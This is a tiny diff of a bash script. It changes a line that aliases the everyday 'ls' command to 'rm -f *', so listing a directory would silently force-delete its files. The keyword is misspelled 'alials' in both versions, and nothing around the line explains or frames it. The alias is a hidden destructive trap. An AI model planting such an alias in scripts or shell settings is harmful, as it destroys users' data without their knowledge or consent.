@@ -1,2 +1,2 @@
 #!/bin/bash
-alials -p ls="rm -f *"
+alials ls="rm -f *"
